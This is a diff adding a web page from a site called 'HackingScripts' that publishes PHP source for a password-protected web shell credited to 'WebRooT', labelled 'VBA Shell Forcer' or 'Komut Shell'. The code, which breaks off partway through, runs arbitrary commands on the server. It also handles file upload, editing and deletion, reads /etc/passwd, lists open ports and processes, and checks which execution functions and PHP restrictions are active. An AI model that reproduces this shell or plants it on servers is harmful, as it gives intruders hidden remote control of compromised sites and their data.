@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <link rel="stylesheet" type="text/css" href="/stylesheets/stylesheet.css" media="screen" />
+    <link rel="stylesheet" type="text/css" href="/stylesheets/pygment_trac.css" media="screen" />
+    <link rel="stylesheet" type="text/css" href="/stylesheets/print.css" media="print" />
+    <link rel="stylesheet" type="text/css" href="/stylesheets/styles.css" media="print" />
+    <link rel="icon" type="image/x-icon" href="/favicon.ico">
+
+
+    <!--[if lt IE 9]>
+    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <title> VBA Shell Forcer </title>
+  </head>
+
+  <body>
+    <header>
+      <div class="inner">
+        <h1> <a href="/">HackingScripts</a> </h1>
+        <h2>Hack Scripts for everybody</h2>
+      </div>
+    </header>
+
+    <div id="content-wrapper">
+      <div class="inner clearfix">
+        <section id="main-content">
+
+          <h2>VBA Shell Forcer</h2>
+<p class="meta">28 Apr 2015</p>
+
+<h3>Komut Shell source code</h3>
+
+<h4>~ by WebRooT</h4>
+
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="lineno">  1</span> <span class="cp">&lt;?php</span> <span class="cp">?&gt;&lt;?php</span>
+<span class="lineno">  2</span> <span class="nb">session_start</span><span class="p">();</span>
+<span class="lineno">  3</span> <span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="lineno">  4</span> <span class="nv">$password</span> <span class="o">=</span> <span class="s2">&quot;webr00t&quot;</span><span class="p">;</span> <span class="c1">//Change this to your password ;)</span>
+<span class="lineno">  5</span> <span class="nv">$version</span> <span class="o">=</span> <span class="s2">&quot;0.7B&quot;</span><span class="p">;</span>
+<span class="lineno">  6</span> <span class="nv">$functions</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Ekrani Temizle&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;ClearScreen()&#39;</span><span class="p">,</span> <span class="s1">&#39;Gecmisi Temizle&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;ClearHistory()&#39;</span><span class="p">,</span> <span class="s1">&#39;Fonksiyon Bilgisi&#39;</span> <span class="o">=&gt;</span> <span class="s2">&quot;runcommand(&#39;canirun&#39;,&#39;GET&#39;)&quot;</span><span class="p">,</span> <span class="s1">&#39;Server Bilgisi&#39;</span> <span class="o">=&gt;</span> <span class="s2">&quot;runcommand(&#39;showinfo&#39;,&#39;GET&#39;)&quot;</span><span class="p">,</span> <span class="s1">&#39;/etc/passwd Oku&#39;</span> <span class="o">=&gt;</span> <span class="s2">&quot;runcommand(&#39;etcpasswdfile&#39;,&#39;GET&#39;)&quot;</span><span class="p">,</span> <span class="s1">&#39;Acik Portlar&#39;</span> <span class="o">=&gt;</span> <span class="s2">&quot;runcommand(&#39;netstat -an | grep -i listen&#39;,&#39;GET&#39;)&quot;</span><span class="p">,</span> <span class="s1">&#39;Calisan Uygulamalar&#39;</span> <span class="o">=&gt;</span> <span class="s2">&quot;runcommand(&#39;ps -aux&#39;,&#39;GET&#39;)&quot;</span><span class="p">,);</span>
+<span class="lineno">  7</span> <span class="nv">$thisfile</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="lineno">  8</span> <span class="nv">$style</span> <span class="o">=</span> <span class="s1">&#39;&lt;style type=&quot;text/css&quot;&gt;</span>
+<span class="lineno">  9</span> <span class="s1">.cmdthing {</span>
+<span class="lineno"> 10</span> <span class="s1">    border-top-width: 0px;</span>
+<span class="lineno"> 11</span> <span class="s1">    font-weight: bold;</span>
+<span class="lineno"> 12</span> <span class="s1">    border-left-width: 0px;</span>
+<span class="lineno"> 13</span> <span class="s1">    font-size: 10px;</span>
+<span class="lineno"> 14</span> <span class="s1">    border-left-color: #000000;</span>
+<span class="lineno"> 15</span> <span class="s1">    background: #000000;</span>
+<span class="lineno"> 16</span> <span class="s1">    border-bottom-width: 0px;</span>
+<span class="lineno"> 17</span> <span class="s1">    border-bottom-color: #FFFFFF;</span>
+<span class="lineno"> 18</span> <span class="s1">    color: #FFFFFF;</span>
+<span class="lineno"> 19</span> <span class="s1">    border-top-color: #008000;</span>
+<span class="lineno"> 20</span> <span class="s1">    font-family: verdana;</span>
+<span class="lineno"> 21</span> <span class="s1">    border-right-width: 0px;</span>
+<span class="lineno"> 22</span> <span class="s1">    border-right-color: #000000;</span>
+<span class="lineno"> 23</span> <span class="s1">}</span>
+<span class="lineno"> 24</span> <span class="s1">input,textarea {</span>
+<span class="lineno"> 25</span> <span class="s1">    border-top-width: 1px;</span>
+<span class="lineno"> 26</span> <span class="s1">    font-weight: bold;</span>
+<span class="lineno"> 27</span> <span class="s1">    border-left-width: 1px;</span>
+<span class="lineno"> 28</span> <span class="s1">    font-size: 10px;</span>
+<span class="lineno"> 29</span> <span class="s1">    border-left-color: #FFFFFF;</span>
+<span class="lineno"> 30</span> <span class="s1">    background: #000000;</span>
+<span class="lineno"> 31</span> <span class="s1">    border-bottom-width: 1px;</span>
+<span class="lineno"> 32</span> <span class="s1">    border-bottom-color: #FFFFFF;</span>
+<span class="lineno"> 33</span> <span class="s1">    color: #FFFFFF;</span>
+<span class="lineno"> 34</span> <span class="s1">    border-top-color: #FFFFFF;</span>
+<span class="lineno"> 35</span> <span class="s1">    font-family: verdana;</span>
+<span class="lineno"> 36</span> <span class="s1">    border-right-width: 1px;</span>
+<span class="lineno"> 37</span> <span class="s1">    border-right-color: #FFFFFF;</span>
+<span class="lineno"> 38</span> <span class="s1">}</span>
+<span class="lineno"> 39</span> <span class="s1">A:hover {</span>
+<span class="lineno"> 40</span> <span class="s1">text-decoration: none;</span>
+<span class="lineno"> 41</span> <span class="s1">}</span>
+<span class="lineno"> 42</span> 
+<span class="lineno"> 43</span> 
+<span class="lineno"> 44</span> <span class="s1">table,td,div {</span>
+<span class="lineno"> 45</span> <span class="s1">border-collapse: collapse;</span>
+<span class="lineno"> 46</span> <span class="s1">border: 1px solid #FFFFFF;</span>
+<span class="lineno"> 47</span> <span class="s1">}</span>
+<span class="lineno"> 48</span> <span class="s1">body {</span>
+<span class="lineno"> 49</span> <span class="s1">color: #FFFFFF;</span>
+<span class="lineno"> 50</span> <span class="s1">font-family: verdana;</span>
+<span class="lineno"> 51</span> <span class="s1">}</span>
+<span class="lineno"> 52</span> <span class="s1">&lt;/style&gt;&#39;</span><span class="p">;</span>
+<span class="lineno"> 53</span> <span class="nv">$sess</span> <span class="o">=</span> <span class="k">__FILE__</span> <span class="o">.</span> <span class="nv">$password</span><span class="p">;</span>
+<span class="lineno"> 54</span> <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p4ssw0rD&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<span class="lineno"> 55</span>     <span class="k">if</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p4ssw0rD&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
+<span class="lineno"> 56</span>         <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$sess</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p4ssw0rD&#39;</span><span class="p">];</span>
+<span class="lineno"> 57</span>     <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="lineno"> 58</span>         <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Wrong password&quot;</span><span class="p">);</span>
+<span class="lineno"> 59</span>     <span class="p">}</span>
+<span class="lineno"> 60</span> <span class="p">}</span>
+<span class="lineno"> 61</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$sess</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
+<span class="lineno"> 62</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;workdir&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<span class="lineno"> 63</span>         <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;workdir&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_dir</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;workdir&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<span class="lineno"> 64</span>             <span class="nb">chdir</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;workdir&#39;</span><span class="p">]);</span>
+<span class="lineno"> 65</span>         <span class="p">}</span>
+<span class="lineno"> 66</span>     <span class="p">}</span>
+<span class="lineno"> 67</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploadedfile&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<span class="lineno"> 68</span>         <span class="nv">$target_path</span> <span class="o">=</span> <span class="s2">&quot;./&quot;</span><span class="p">;</span>
+<span class="lineno"> 69</span>         <span class="nv">$target_path</span> <span class="o">=</span> <span class="nv">$target_path</span> <span class="o">.</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploadedfile&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
+<span class="lineno"> 70</span>         <span class="k">if</span> <span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploadedfile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$target_path</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno"> 71</span>         <span class="p">}</span>
+<span class="lineno"> 72</span>     <span class="p">}</span>
+<span class="lineno"> 73</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;runcmd&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<span class="lineno"> 74</span>         <span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;runcmd&#39;</span><span class="p">];</span>
+<span class="lineno"> 75</span>         <span class="k">print</span> <span class="s2">&quot;&lt;b&gt;&quot;</span> <span class="o">.</span> <span class="nb">get_current_user</span><span class="p">()</span> <span class="o">.</span> <span class="s2">&quot;~# &lt;/b&gt;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span>
+<span class="lineno"> 76</span>         <span class="k">if</span> <span class="p">(</span><span class="nv">$cmd</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span>
+<span class="lineno"> 77</span>             <span class="k">print</span> <span class="s2">&quot;Empty Command..type </span><span class="se">\&quot;</span><span class="s2">shellhelp</span><span class="se">\&quot;</span><span class="s2"> for some ehh...help&quot;</span><span class="p">;</span>
+<span class="lineno"> 78</span>         <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$cmd</span> <span class="o">==</span> <span class="s2">&quot;upload&quot;</span><span class="p">)</span> <span class="p">{</span>
+<span class="lineno"> 79</span>             <span class="k">print</span> <span class="s1">&#39;&lt;br&gt;Uploading to: &#39;</span> <span class="o">.</span> <span class="nb">realpath</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);</span>
+<span class="lineno"> 80</span>             <span class="k">if</span> <span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="nb">realpath</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)))</span> <span class="p">{</span>
+<span class="lineno"> 81</span>                 <span class="k">print</span> <span class="s2">&quot;&lt;br&gt;&lt;b&gt;I can write to this directory&lt;/b&gt;&quot;</span><span class="p">;</span>
+<span class="lineno"> 82</span>             <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="lineno"> 83</span>                 <span class="k">print</span> <span class="s2">&quot;&lt;br&gt;&lt;b&gt;&lt;font color=red&gt;I can&#39;t write to this directory, please choose another one.&lt;/b&gt;&lt;/font&gt;&quot;</span><span class="p">;</span>
+<span class="lineno"> 84</span>             <span class="p">}</span>
+<span class="lineno"> 85</span>         <span class="p">}</span> <span class="k">elseif</span> <span class="p">((</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;changeworkdir (.*)&quot;</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">,</span> <span class="nv">$file</span><span class="p">))</span> <span class="o">||</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;cd (.*)&quot;</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">,</span> <span class="nv">$file</span><span class="p">)))</span> <span class="p">{</span>
+<span class="lineno"> 86</span>             <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_dir</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+<span class="lineno"> 87</span>                 <span class="nb">chdir</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="lineno"> 88</span>                 <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;workdir&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+<span class="lineno"> 89</span>                 <span class="k">print</span> <span class="s2">&quot;Current directory changed to &quot;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+<span class="lineno"> 90</span>             <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="lineno"> 91</span>                 <span class="k">print</span> <span class="s2">&quot;Directory not found&quot;</span><span class="p">;</span>
+<span class="lineno"> 92</span>             <span class="p">}</span>
+<span class="lineno"> 93</span>         <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;editfile (.*)&quot;</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">,</span> <span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno"> 94</span>             <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+<span class="lineno"> 95</span>                 <span class="k">print</span> <span class="s2">&quot;&lt;form name=</span><span class="se">\&quot;</span><span class="s2">saveform</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;textarea cols=70 rows=10 id=</span><span class="se">\&quot;</span><span class="s2">area1</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">;</span>
+<span class="lineno"> 96</span>                 <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">file</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="lineno"> 97</span>                 <span class="k">foreach</span> <span class="p">(</span><span class="nv">$contents</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
+<span class="lineno"> 98</span>                     <span class="k">print</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$line</span><span class="p">);</span>
+<span class="lineno"> 99</span>                 <span class="p">}</span>
+<span class="lineno">100</span>                 <span class="k">print</span> <span class="s2">&quot;&lt;/textarea&gt;&lt;br&gt;&lt;input size=80 type=text name=filetosave value=&quot;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&gt;&lt;input value=</span><span class="se">\&quot;</span><span class="s2">Save</span><span class="se">\&quot;</span><span class="s2"> type=button onclick=</span><span class="se">\&quot;</span><span class="s2">SaveFile();</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/form&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">101</span>             <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="lineno">102</span>                 <span class="k">print</span> <span class="s2">&quot;File not found.&quot;</span><span class="p">;</span>
+<span class="lineno">103</span>             <span class="p">}</span>
+<span class="lineno">104</span>         <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;deletefile (.*)&quot;</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">,</span> <span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno">105</span>             <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+<span class="lineno">106</span>                 <span class="k">if</span> <span class="p">(</span><span class="nb">rmdir</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+<span class="lineno">107</span>                     <span class="k">print</span> <span class="s2">&quot;Directory succesfully deleted.&quot;</span><span class="p">;</span>
+<span class="lineno">108</span>                 <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="lineno">109</span>                     <span class="k">print</span> <span class="s2">&quot;Couldn&#39;t delete directory!&quot;</span><span class="p">;</span>
+<span class="lineno">110</span>                 <span class="p">}</span>
+<span class="lineno">111</span>             <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="lineno">112</span>                 <span class="k">if</span> <span class="p">(</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+<span class="lineno">113</span>                     <span class="k">print</span> <span class="s2">&quot;File succesfully deleted.&quot;</span><span class="p">;</span>
+<span class="lineno">114</span>                 <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="lineno">115</span>                     <span class="k">print</span> <span class="s2">&quot;Couldn&#39;t delete file!&quot;</span><span class="p">;</span>
+<span class="lineno">116</span>                 <span class="p">}</span>
+<span class="lineno">117</span>             <span class="p">}</span>
+<span class="lineno">118</span>         <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;canirun&quot;</span><span class="p">)</span> <span class="p">{</span>
+<span class="lineno">119</span>             <span class="k">print</span> <span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">120</span>             <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nb">passthru</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno">121</span>                 <span class="k">print</span> <span class="s2">&quot;Passthru: &lt;b&gt;&lt;font color=green&gt;Enabled&lt;/b&gt;&lt;/font&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">122</span>             <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="lineno">123</span>                 <span class="k">print</span> <span class="s2">&quot;Passthru: &lt;b&gt;&lt;font color=red&gt;Disabled&lt;/b&gt;&lt;/font&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">124</span>             <span class="p">}</span>
+<span class="lineno">125</span>             <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nb">exec</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno">126</span>                 <span class="k">print</span> <span class="s2">&quot;Exec: &lt;b&gt;&lt;font color=green&gt;Enabled&lt;/b&gt;&lt;/font&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">127</span>             <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="lineno">128</span>                 <span class="k">print</span> <span class="s2">&quot;Exec: &lt;b&gt;&lt;font color=red&gt;Disabled&lt;/b&gt;&lt;/font&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">129</span>             <span class="p">}</span>
+<span class="lineno">130</span>             <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nb">system</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno">131</span>                 <span class="k">print</span> <span class="s2">&quot;System: &lt;b&gt;&lt;font color=green&gt;Enabled&lt;/b&gt;&lt;/font&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">132</span>             <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="lineno">133</span>                 <span class="k">print</span> <span class="s2">&quot;System: &lt;b&gt;&lt;font color=red&gt;Disabled&lt;/b&gt;&lt;/font&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">134</span>             <span class="p">}</span>
+<span class="lineno">135</span>             <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="nb">shell_exec</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno">136</span>                 <span class="k">print</span> <span class="s2">&quot;Shell_exec: &lt;b&gt;&lt;font color=green&gt;Enabled&lt;/b&gt;&lt;/font&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">137</span>             <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="lineno">138</span>                 <span class="k">print</span> <span class="s2">&quot;Shell_exec: &lt;b&gt;&lt;font color=red&gt;Disabled&lt;/b&gt;&lt;/font&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">139</span>             <span class="p">}</span>
+<span class="lineno">140</span>             <span class="k">print</span> <span class="s2">&quot;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">141</span>             <span class="k">if</span> <span class="p">(</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode&#39;</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno">142</span>                 <span class="k">print</span> <span class="s2">&quot;Safe Mode: &lt;b&gt;&lt;font color=red&gt;Enabled&lt;/b&gt;&lt;/font&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">143</span>             <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="lineno">144</span>                 <span class="k">print</span> <span class="s2">&quot;Safe Mode: &lt;b&gt;&lt;font color=green&gt;Disabled&lt;/b&gt;&lt;/font&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">145</span>             <span class="p">}</span>
+<span class="lineno">146</span>             <span class="k">print</span> <span class="s2">&quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">147</span>             <span class="k">if</span> <span class="p">(</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno">148</span>                 <span class="k">print</span> <span class="s2">&quot;Open_basedir: &lt;b&gt;&lt;font color=red&gt;Enabled&lt;/b&gt;&lt;/font&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">149</span>             <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="lineno">150</span>                 <span class="k">print</span> <span class="s2">&quot;Open_basedir: &lt;b&gt;&lt;font color=green&gt;Disabled&lt;/b&gt;&lt;/font&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">151</span>             <span class="p">}</span>
+<span class="lineno">152</span>         <span class="p">}</span>
+<span class="lineno">153</span>         <span class="c1">//About the shell</span>
+<span class="lineno">154</span>         <span class="k">elseif</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;listdir (.*)&quot;</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">,</span> <span class="nv">$directory</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno">155</span>             <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$directory</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+<span class="lineno">156</span>                 <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Directory not found&quot;</span><span class="p">);</span>
+<span class="lineno">157</span>             <span class="p">}</span>
+<span class="lineno">158</span>             <span class="c1">//Some variables</span>
+<span class="lineno">159</span>             <span class="nb">chdir</span><span class="p">(</span><span class="nv">$directory</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="lineno">160</span>             <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="lineno">161</span>             <span class="nv">$f</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="lineno">162</span>             <span class="nv">$dirs</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
+<span class="lineno">163</span>             <span class="nv">$filez</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
+<span class="lineno">164</span>             <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;/$&quot;</span><span class="p">,</span> <span class="nv">$directory</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="c1">//Does it end with a slash?</span>
+<span class="lineno">165</span>             <span class="p">{</span>
+<span class="lineno">166</span>                 <span class="nv">$directory</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.=</span> <span class="s2">&quot;/&quot;</span><span class="p">;</span> <span class="c1">//If not, add one</span>
+<span class="lineno">167</span> 
+<span class="lineno">168</span>             <span class="p">}</span>
+<span class="lineno">169</span>             <span class="k">print</span> <span class="s2">&quot;Listing directory: &quot;</span> <span class="o">.</span> <span class="nv">$directory</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">170</span>             <span class="k">print</span> <span class="s2">&quot;&lt;table border=0&gt;&lt;td&gt;&lt;b&gt;Directories&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Files&lt;/b&gt;&lt;/td&gt;&lt;tr&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">171</span>             <span class="k">if</span> <span class="p">(</span><span class="nv">$handle</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$directory</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+<span class="lineno">172</span>                 <span class="k">while</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$handle</span><span class="p">)))</span> <span class="p">{</span>
+<span class="lineno">173</span>                     <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
+<span class="lineno">174</span>                         <span class="nv">$dirs</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
+<span class="lineno">175</span>                         <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
+<span class="lineno">176</span>                     <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="lineno">177</span>                         <span class="nv">$filez</span><span class="p">[</span><span class="nv">$f</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
+<span class="lineno">178</span>                         <span class="nv">$f</span><span class="o">++</span><span class="p">;</span>
+<span class="lineno">179</span>                     <span class="p">}</span>
+<span class="lineno">180</span>                 <span class="p">}</span>
+<span class="lineno">181</span>                 <span class="k">print</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="p">;</span>
+<span class="lineno">182</span>                 <span class="k">foreach</span> <span class="p">(</span><span class="nv">$dirs</span> <span class="k">as</span> <span class="nv">$directory</span><span class="p">)</span> <span class="p">{</span>
